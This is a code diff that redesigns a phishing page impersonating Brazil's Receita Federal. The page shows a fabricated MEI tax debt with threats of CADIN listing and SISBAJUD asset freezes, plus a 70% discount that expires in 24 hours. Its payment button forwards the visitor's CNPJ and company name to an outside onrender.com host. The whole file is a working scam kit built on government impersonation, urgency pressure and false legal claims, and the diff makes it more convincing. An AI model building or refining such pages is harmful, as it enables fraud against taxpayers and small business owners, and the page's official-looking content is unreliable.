@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Regularização Fiscal - Receita Federal</title>
+    <title>Regularização de Débitos | Secretaria da Receita Federal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --gov-blue: #004587;
-            --gov-blue-dark: #003366;
+            --primary-blue: #004587;
+            --secondary-blue: #1351b4;
+            --dark-blue: #0c326f;
             --gov-gold: #ffcc00;
-            --danger: #d32f2f;
-            --success: #2e7d32;
-            --bg-gray: #f8f9fa;
-            --text-main: #212529;
-            --text-muted: #6c757d;
+            --success-green: #168821;
+            --danger-red: #e52207;
+            --warning-orange: #ff5f00;
+            --light-gray: #f8f9fa;
+            --border-gray: #ccc;
+            --text-dark: #333333;
+            --text-light: #666666;
             --white: #ffffff;
-            --border-color: #dee2e6;
         }
 
         * {
@@ -28,17 +30,18 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-gray);
-            color: var(--text-main);
-            line-height: 1.6;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            background-color: var(--white);
+            color: var(--text-dark);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Barra Superior Institucional */
-        .gov-header-top {
-            background-color: var(--white);
-            border-bottom: 1px solid var(--border-color);
-            padding: 8px 20px;
+        /* Top Bar Gov.br Style */
+        .gov-top-bar {
+            background: var(--white);
+            border-bottom: 1px solid #eeeeee;
+            padding: 10px 10%;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -46,385 +49,427 @@
             font-weight: 600;
         }
 
-        .gov-header-top .brasil-flag {
+        .gov-top-bar a {
+            text-decoration: none;
+            color: var(--text-dark);
             display: flex;
             align-items: center;
             gap: 8px;
-            color: var(--text-main);
-            text-decoration: none;
         }
 
-        /* Cabeçalho Principal */
-        header {
-            background-color: var(--gov-blue);
-            color: var(--white);
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .logo-container {
-            max-width: 1000px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .brasao {
-            height: 60px;
-            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
-        }
-
-        .header-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        main {
-            max-width: 600px;
-            margin: 30px auto;
-            padding: 0 20px;
-        }
-
-        /* Alerta de Situação */
-        .status-alert {
-            background-color: #fff4e5;
-            border-left: 5px solid #ffa000;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 4px;
+        .gov-top-bar .social-links {
             display: flex;
             gap: 15px;
-            align-items: flex-start;
+            color: var(--primary-blue);
         }
 
-        .status-alert-content h2 {
-            font-size: 1rem;
-            color: #663c00;
-            margin-bottom: 5px;
+        /* Main Header */
+        header {
+            background: var(--primary-blue);
+            padding: 25px 10%;
+            color: var(--white);
         }
 
-        .status-alert-content p {
-            font-size: 0.9rem;
-            color: #663c00;
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 20px;
         }
 
-        /* Card de Informações do Contribuinte */
-        .contribuinte-card {
-            background: var(--white);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            overflow: hidden;
-            margin-bottom: 25px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        .brasao-republica {
+            height: 70px;
+            width: auto;
         }
 
-        .card-header {
-            background: #f1f3f5;
-            padding: 12px 20px;
-            border-bottom: 1px solid var(--border-color);
-            font-size: 0.85rem;
+        .header-text h1 {
+            font-size: 1.4rem;
             font-weight: 700;
-            color: var(--gov-blue);
-            text-transform: uppercase;
+            letter-spacing: -0.5px;
         }
 
-        .card-body {
+        .header-text p {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+
+        /* Main Content Layout */
+        main {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 30px;
+        }
+
+        @media (max-width: 850px) {
+            main {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Left Column: Details */
+        .content-details h2 {
+            font-size: 1.5rem;
+            color: var(--primary-blue);
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--gov-gold);
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+
+        .notice-box {
+            background: #f0f5ff;
+            border-left: 4px solid var(--secondary-blue);
             padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 0 4px 4px 0;
         }
 
-        .info-group {
-            margin-bottom: 15px;
+        .notice-box p {
+            font-size: 0.95rem;
+            color: var(--dark-blue);
         }
 
-        .info-group:last-child {
-            margin-bottom: 0;
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
         }
 
-        .info-label {
-            font-size: 0.75rem;
-            color: var(--text-muted);
+        .data-table th, .data-table td {
+            text-align: left;
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .data-table th {
+            font-size: 0.8rem;
             text-transform: uppercase;
+            color: var(--text-light);
             font-weight: 600;
+            width: 30%;
+        }
+
+        .data-table td {
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 1rem;
+        }
+
+        .status-pill {
+            display: inline-block;
+            background: #fff1f0;
+            color: var(--danger-red);
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            border: 1px solid var(--danger-red);
+        }
+
+        /* Right Column: Payment Card */
+        .payment-card {
+            background: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 8px;
+            padding: 30px;
+            position: sticky;
+            top: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .payment-card h3 {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .price-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .price-label {
+            font-size: 0.85rem;
+            color: var(--text-light);
             display: block;
         }
 
-        .info-value {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: var(--text-main);
-            word-break: break-all;
-        }
-
-        .badge-pendencia {
-            display: inline-block;
-            background: var(--danger);
-            color: white;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-size: 0.75rem;
+        .price-value {
+            font-size: 2.5rem;
             font-weight: 800;
-            margin-top: 8px;
+            color: var(--text-dark);
         }
 
-        /* Seção de Regularização */
-        .regularizacao-section {
-            background: var(--white);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 25px;
-            text-align: center;
-        }
-
-        .section-title {
-            font-size: 1.2rem;
+        .discount-tag {
+            background: #e6f4ea;
+            color: var(--success-green);
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
             font-weight: 700;
-            margin-bottom: 20px;
-            color: var(--gov-blue-dark);
+            margin-top: 5px;
+            display: inline-block;
         }
 
-        .consequences-list {
-            text-align: left;
-            margin-bottom: 25px;
-            background: #fafafa;
-            padding: 15px;
-            border-radius: 6px;
+        .btn-action {
+            display: block;
+            background: var(--secondary-blue);
+            color: var(--white);
+            text-align: center;
+            text-decoration: none;
+            padding: 16px;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 1rem;
+            transition: background 0.2s;
+            margin-bottom: 15px;
+        }
+
+        .btn-action:hover {
+            background: var(--dark-blue);
+        }
+
+        .pix-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--text-light);
+        }
+
+        .pix-logo {
+            height: 16px;
+        }
+
+        /* Consequences List */
+        .consequences-section {
+            margin-top: 30px;
+        }
+
+        .consequences-section h4 {
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .consequence-item {
             display: flex;
-            align-items: center;
             gap: 12px;
+            margin-bottom: 12px;
             font-size: 0.9rem;
-            margin-bottom: 10px;
-            color: #444;
         }
 
-        .consequence-item:last-child { margin-bottom: 0; }
-
-        .check-icon { color: var(--danger); font-weight: bold; }
-
-        /* Valores e Botão */
-        .payment-info {
-            margin-bottom: 25px;
+        .consequence-item span:first-child {
+            color: var(--danger-red);
+            font-weight: bold;
         }
 
-        .valor-label {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-        }
-
-        .valor-total {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--text-main);
-            display: block;
-        }
-
-        .btn-gov {
-            display: block;
-            background-color: var(--success);
-            color: var(--white);
-            text-decoration: none;
-            padding: 18px;
-            border-radius: 6px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            transition: background 0.2s;
-            box-shadow: 0 4px 0 #1b5e20;
-            margin-bottom: 15px;
-        }
-
-        .btn-gov:hover {
-            background-color: #266b2a;
-        }
-
-        .btn-gov:active {
-            transform: translateY(2px);
-            box-shadow: 0 2px 0 #1b5e20;
-        }
-
-        .pix-info {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: var(--text-muted);
-        }
-
-        .pix-logo { height: 18px; }
-
-        /* Rodapé */
+        /* Footer */
         footer {
-            margin-top: 50px;
-            padding: 40px 20px;
-            background: #eee;
-            border-top: 1px solid var(--border-color);
+            background: #f2f2f2;
+            padding: 60px 10% 40px;
+            border-top: 1px solid #ddd;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 40px;
+        }
+
+        @media (max-width: 700px) {
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .footer-col h5 {
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            color: var(--text-dark);
+        }
+
+        .footer-col p, .footer-col a {
+            font-size: 0.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .footer-bottom {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
             text-align: center;
             font-size: 0.75rem;
-            color: #666;
+            color: var(--text-light);
         }
 
-        .footer-links {
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: #666;
-            text-decoration: none;
-        }
-
-        .security-seal {
-            margin-top: 20px;
-            opacity: 0.7;
-        }
-
-        @media (max-width: 480px) {
-            .valor-total { font-size: 2rem; }
-            .header-title { font-size: 0.9rem; }
-        }
+        /* Utility */
+        .text-danger { color: var(--danger-red); }
+        .font-bold { font-weight: 700; }
     </style>
 </head>
 <body>
 
-    <div class="gov-header-top">
-        <a href="#" class="brasil-flag">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" width="20" alt="Brasil">
-            BRASIL
+    <div class="gov-top-bar">
+        <a href="https://www.gov.br">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" width="18" alt="Brasil">
+            BRASIL <span style="font-weight: 400; margin-left: 5px; color: #666;">| Portal de Serviços</span>
         </a>
-        <div style="color: #004587;">Acesso à informação</div>
+        <div class="social-links">
+            <span>CORONAVÍRUS (COVID-19)</span>
+            <span>ACESSO À INFORMAÇÃO</span>
+        </div>
     </div>
 
     <header>
-        <div class="logo-container">
-            <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão da República" class="brasao">
-            <div class="header-title">Ministério da Fazenda</div>
-            <div style="font-size: 0.8rem; opacity: 0.9;">Secretaria Especial da Receita Federal do Brasil</div>
+        <div class="header-content">
+            <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão Nacional" class="brasao-republica">
+            <div class="header-text">
+                <p>MINISTÉRIO DA FAZENDA</p>
+                <h1>Secretaria Especial da Receita Federal do Brasil</h1>
+            </div>
         </div>
     </header>
 
     <main>
-        <div class="status-alert">
-            <div class="status-alert-content">
-                <h2>Notificação de Irregularidade Fiscal</h2>
-                <p>Identificamos pendências que requerem sua atenção imediata para evitar sanções administrativas e judiciais.</p>
-            </div>
-        </div>
-
-        <div class="contribuinte-card">
-            <div class="card-header">Dados do Contribuinte</div>
-            <div class="card-body">
-                <div class="info-group">
-                    <span class="info-label">Nome / Razão Social</span>
-                    <span id="empresa" class="info-value">Carregando...</span>
-                </div>
-                <div class="info-group">
-                    <span class="info-label">CPF / CNPJ</span>
-                    <span id="cnpj" class="info-value">Carregando...</span>
-                </div>
-                <div class="info-group">
-                    <span class="info-label">Situação Atual</span>
-                    <span class="badge-pendencia">DÉBITO EM DÍVIDA ATIVA</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="regularizacao-section">
-            <h1 class="section-title">Regularização de Pendências</h1>
+        <section class="content-details">
+            <h2>Detalhamento da Notificação</h2>
             
-            <div class="consequences-list">
-                <div class="consequence-item">
-                    <span class="check-icon">✕</span>
-                    <span>Impedimento de emissão de Certidão Negativa (CND)</span>
-                </div>
-                <div class="consequence-item">
-                    <span class="check-icon">✕</span>
-                    <span>Restrição de crédito em instituições financeiras (BACEN)</span>
-                </div>
-                <div class="consequence-item">
-                    <span class="check-icon">✕</span>
-                    <span>Inclusão no CADIN e órgãos de proteção ao crédito</span>
-                </div>
-                <div class="consequence-item">
-                    <span class="check-icon">✕</span>
-                    <span>Risco de execução fiscal e bloqueio de ativos</span>
-                </div>
+            <div class="notice-box">
+                <p><strong>Atenção:</strong> Constatamos divergências fiscais vinculadas ao documento informado abaixo. A ausência de regularização dentro do prazo regulamentar poderá ensejar a inscrição em <strong>Dívida Ativa da União</strong> e o ajuizamento de <strong>Execução Fiscal</strong>.</p>
             </div>
 
-            <div class="payment-info">
-                <span class="valor-label">Total para quitação com desconto:</span>
-                <span class="valor-total">R$ 56,47</span>
-                <p style="font-size: 0.8rem; color: var(--success); font-weight: 700; margin-top: 5px;">
-                    ✓ Desconto de 70% aplicado para pagamento à vista
+            <table class="data-table">
+                <tr>
+                    <th>Contribuinte</th>
+                    <td id="empresa">Processando...</td>
+                </tr>
+                <tr>
+                    <th>CPF / CNPJ</th>
+                    <td id="cnpj">Processando...</td>
+                </tr>
+                <tr>
+                    <th>Natureza do Débito</th>
+                    <td>Multa Administrativa / Pendência MEI</td>
+                </tr>
+                <tr>
+                    <th>Situação Atual</th>
+                    <td><span class="status-pill">DÉBITO NÃO REGULARIZADO</span></td>
+                </tr>
+            </table>
+
+            <div class="consequences-section">
+                <h4>Implicações Legais (Lei nº 10.522/02)</h4>
+                <div class="consequence-item">
+                    <span>●</span>
+                    <p>Inclusão no Cadastro Informativo de Créditos não Quitados (<strong>CADIN</strong>).</p>
+                </div>
+                <div class="consequence-item">
+                    <span>●</span>
+                    <p>Impedimento de contratar com o Poder Público e participar de licitações.</p>
+                </div>
+                <div class="consequence-item">
+                    <span>●</span>
+                    <p>Restrição total para obtenção de empréstimos e financiamentos bancários.</p>
+                </div>
+                <div class="consequence-item">
+                    <span>●</span>
+                    <p>Bloqueio de ativos financeiros via sistema <strong>SISBAJUD</strong> em caso de execução judicial.</p>
+                </div>
+            </div>
+        </section>
+
+        <aside>
+            <div class="payment-card">
+                <h3>Resumo da Guia (DARF)</h3>
+                
+                <div class="price-container">
+                    <span class="price-label">Valor consolidado para quitação:</span>
+                    <span class="price-value">R$ 56,47</span>
+                    <br>
+                    <span class="discount-tag">Desconto de 70% para liquidação imediata</span>
+                </div>
+
+                <a href="#" id="main-btn" class="btn-action">
+                    EMITIR GUIA DE RECOLHIMENTO
+                </a>
+
+                <div class="pix-badge">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix" class="pix-logo">
+                    Baixa automática via PIX
+                </div>
+
+                <p style="font-size: 0.7rem; color: #888; text-align: center; margin-top: 20px;">
+                    O prazo para aproveitamento deste desconto expira em 24 horas.
                 </p>
             </div>
-
-            <a href="#" id="main-btn" class="btn-gov">
-                GERAR GUIA DE PAGAMENTO
-            </a>
-
-            <div class="pix-info">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix" class="pix-logo">
-                Compensação imediata via PIX
-            </div>
-        </div>
+        </aside>
     </main>
 
     <footer>
-        <div class="footer-links">
-            <a href="#">Privacidade</a>
-            <a href="#">Termos de Uso</a>
-            <a href="#">Canais de Atendimento</a>
-            <a href="#">Ouvidoria</a>
+        <div class="footer-content">
+            <div class="footer-col">
+                <h5>Secretaria Especial da Receita Federal do Brasil</h5>
+                <p>Esplanada dos Ministérios, Bloco P - Brasília - DF</p>
+                <p>CEP: 70048-900</p>
+            </div>
+            <div class="footer-col">
+                <h5>Serviços</h5>
+                <a href="#">Consultar CPF</a>
+                <a href="#">Consultar CNPJ</a>
+                <a href="#">Certidões e Situação Fiscal</a>
+                <a href="#">E-CAC</a>
+            </div>
+            <div class="footer-col">
+                <h5>Canais de Atendimento</h5>
+                <a href="#">Fale Conosco</a>
+                <a href="#">Ouvidoria</a>
+                <a href="#">Unidades de Atendimento</a>
+            </div>
         </div>
-        <p>© 2026 Secretaria Especial da Receita Federal do Brasil</p>
-        <p>Esplanada dos Ministérios, Bloco P - Brasília - DF</p>
-        
-        <div class="security-seal">
-            <img src="https://img.icons8.com/ios-filled/50/666666/lock.png" width="16" style="vertical-align: middle; margin-right: 5px;">
-            Ambiente Seguro e Criptografado
+        <div class="footer-bottom">
+            <p>&copy; 2026 Receita Federal do Brasil. Todos os direitos reservados.</p>
+            <p style="margin-top: 10px; opacity: 0.6;">Este é um portal de serviços governamentais. Proteja seus dados.</p>
         </div>
     </footer>
 
     <script>
         function clean(val) {
             if (!val) return "";
-            // Remove colchetes, aspas e espaços extras que podem vir de sistemas de automação
             return val.replace(/[\[\]"']/g, "").trim();
         }
 
         window.onload = function() {
-            // Captura os parâmetros da URL
             const params = new URLSearchParams(window.location.search);
-            
-            // Pega o CNPJ e a Empresa da URL
             const cnpjRaw = params.get('cnpj');
             const empresaRaw = params.get('empresa');
 
-            // Limpa e exibe os dados
             const cnpj = clean(cnpjRaw) || "Não identificado";
             const empresa = clean(empresaRaw) || "Contribuinte não identificado";
 
             document.getElementById('cnpj').textContent = cnpj;
             document.getElementById('empresa').textContent = empresa;
 
-            // Configura o link do botão para redirecionar mantendo os dados
             const btn = document.getElementById('main-btn');
             const targetBase = "https://nacionalmei.onrender.com/PEND/";
 
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                // Constrói a URL final conforme o formato solicitado
                 const finalUrl = `${targetBase}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
                 window.location.href = finalUrl;
             });
